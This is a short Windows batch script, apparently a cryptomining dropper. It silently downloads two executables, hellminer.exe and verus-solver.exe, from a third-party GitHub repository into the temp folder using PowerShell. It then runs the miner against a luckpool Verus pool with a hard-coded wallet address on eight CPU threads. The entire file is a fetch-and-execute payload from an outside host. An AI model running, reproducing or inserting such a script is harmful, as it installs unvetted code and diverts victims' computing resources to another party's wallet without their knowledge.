@echo off
cd %temp%

if not exist "hellminer.exe" powershell -command Invoke-WebRequest "https://github.com/rxu7s/Public/raw/main/hellminer.exe" -OutFile "hellminer.exe"
if not exist "verus-solver.exe" powershell -command Invoke-WebRequest "https://github.com/rxu7s/Public/raw/main/verus-solver.exe" -OutFile "verus-solver.exe"

hellminer.exe -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RKmtJ9n4RDNoG95Y6sxKST3wyiHgDG5t4M.x -p x --cpu 8
exit